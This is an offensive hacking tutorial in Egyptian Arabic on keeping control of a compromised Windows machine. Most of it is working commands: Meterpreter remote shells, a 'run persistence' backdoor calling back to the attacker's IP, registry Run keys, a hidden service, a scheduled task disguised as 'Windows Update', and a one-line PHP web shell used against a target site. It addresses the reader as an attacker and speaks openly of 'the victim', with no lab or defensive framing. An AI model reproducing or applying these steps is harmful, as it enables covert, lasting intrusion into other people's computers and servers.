# **🔹 تشغيل الأوامر عن بُعد وتقنيات الاستمرارية 🔹**

## **📌 يعني إيه تشغيل أوامر عن بُعد والاستمرارية؟**

✅ بعد ما تخترق جهاز، مش عايز تفقد السيطرة عليه، فلازم:

- **تشغل أوامر عن بُعد** لتنفيذ أي حاجة على الجهاز المخترق.
- **تحافظ على وجودك في الجهاز (Persistence)** بحيث حتى لو الضحية قفل الجهاز، تقدر ترجع تاني.  
    ✅ ده بيتم عن طريق **إعداد طرق تضمن إنك تفضل متحكم في الجهاز حتى بعد إعادة تشغيله**.

---

## **🔥 تشغيل أوامر عن بُعد**

📌 بعد ما تسيطر على جهاز باستخدام **Meterpreter**، تقدر تنفذ أي أوامر عليه كأنك قاعد قدامه.

### **🟢 1. تشغيل أوامر نظام التشغيل مباشرة**

📌 لو عايز تشغل أوامر Windows:

```bash
meterpreter > execute -f cmd.exe -i -H
```

🎯 **ده بيفتح لك Command Prompt تتحكم فيه بالكامل**

📌 **تشغيل أمر معين على النظام:**

```bash
meterpreter > shell
whoami
ipconfig
```

🎯 **هيعرض لك اسم المستخدم والشبكة اللي الجهاز متصل بيها**

📌 **تشغيل أمر PowerShell:**

```bash
meterpreter > powershell_shell
Get-Process
```

🎯 **هتقدر تنفذ أي أمر PowerShell بسهولة**

📌 **تشغيل برامج أو أدوات على الجهاز الضحية:**

```bash
meterpreter > execute -f notepad.exe
```

🎯 **هيشغل "المفكرة" على الجهاز الضحية، وممكن تستخدمها لإرباك الضحية**

---

## **🔥 تقنيات الاستمرارية (Persistence)**

📌 **الهدف إنك تحافظ على اتصالك بالجهاز حتى لو المستخدم قفله أو عمل Restart**

### **🟢 2. إنشاء Backdoor لاسترجاع الجلسة تلقائيًا**

📌 **استخدام Metasploit لـ عمل Backdoor في الجهاز المخترق:**

```bash
meterpreter > run persistence -U -i 10 -p 4444 -r [Your IP]
```

🎯 **ده بيخلي الـ Backdoor يشتغل كل 10 ثواني ويفتح اتصال مع جهازك**

📌 **إضافة Payload يعمل تلقائيًا عند بدء التشغيل (Registry Run Key Method):**

```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f
```

🎯 **كده أي حد يفتح الجهاز، الـ Backdoor يشتغل تلقائيًا**

---

### **🟢 3. إنشاء خدمة Windows خفية**

📌 **عمل خدمة في Windows تخلي الـ Backdoor شغال دايمًا:**

```bash
sc create backdoor_service binPath= "C:\Windows\System32\backdoor.exe" start= auto
```

🎯 **الجهاز كل ما يعمل Restart، الـ Backdoor يشتغل تاني**

📌 **تشغيل الخدمة يدويًا (لو وقفت):**

```bash
net start backdoor_service
```

📌 **إيقافها (لو عايز تحذفها لاحقًا):**

```bash
sc delete backdoor_service
```

---

### **🟢 4. زرع Scheduled Task لتشغيل Backdoor تلقائيًا**

📌 **إنشاء مهمة مجدولة لتشغيل الـ Backdoor كل مرة يفتح الجهاز:**

```bash
schtasks /create /tn "Windows Update" /tr "C:\Windows\System32\backdoor.exe" /sc onlogon /ru System
```

🎯 **كده الجهاز كل ما يفتح، الـ Backdoor هيشتغل معاه بدون مشاكل**

📌 **لمسح المهمة لاحقًا:**

```bash
schtasks /delete /tn "Windows Update" /f
```

---

### **🟢 5. زرع Web Shell للوصول الدائم للجهاز**

📌 **لو الجهاز فيه خادم ويب (IIS, Apache)، ممكن تزرع Web Shell لتتحكم فيه دايمًا:**

1. **ارفع Web Shell (PHP) للموقع:**

```php
<?php system($_GET['cmd']); ?>
```

2. **شغله من المتصفح كده:**

```
http://target.com/shell.php?cmd=whoami
```

🎯 **هتقدر تشغل أوامر عن بُعد من أي مكان في العالم**

---

# **💡 الخلاصة بالمصري:**

1️⃣ **لو عايز تنفذ أوامر عن بُعد، استخدم `shell` أو `execute -f cmd.exe`**  
2️⃣ **لو عايز الجهاز يفضل متصل بيك حتى بعد Restart، اعمل `persistence -U -i 10`**  
3️⃣ **لو عايز الـ Backdoor يشتغل دايمًا، حطه في `Registry` أو `Scheduled Tasks`**  
4️⃣ **لو الجهاز فيه ويب سيرفر، زرع Web Shell للتحكم فيه من أي مكان**  
5️⃣ **استخدم خدمات Windows (`sc create`) لو عايز تبقى مخفي أكتر**

---

# **🛠️ خطوات عملية لتشغيل الأوامر عن بُعد والاستمرارية**

✅ **1. تشغيل أوامر عن بُعد:**

```bash
meterpreter > shell
whoami
ipconfig
```

✅ **2. عمل Backdoor يعمل تلقائيًا بعد Restart:**

```bash
meterpreter > run persistence -U -i 10 -p 4444 -r [Your IP]
```

✅ **3. إضافة Backdoor في الـ Registry لتشغيله عند فتح الجهاز:**

```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f
```

✅ **4. إنشاء خدمة Windows لإخفاء الـ Backdoor:**

```bash
sc create backdoor_service binPath= "C:\Windows\System32\backdoor.exe" start= auto
```

✅ **5. زرع Web Shell على خادم ويب:**

```php
<?php system($_GET['cmd']); ?>
```

ثم تشغيله عبر المتصفح:

```
http://target.com/shell.php?cmd=whoami
```

🎯 **لو نفذت الخطوات دي، هتبقى عندك سيطرة كاملة على الجهاز حتى بعد ما الضحية يقفله!** 🚀🔥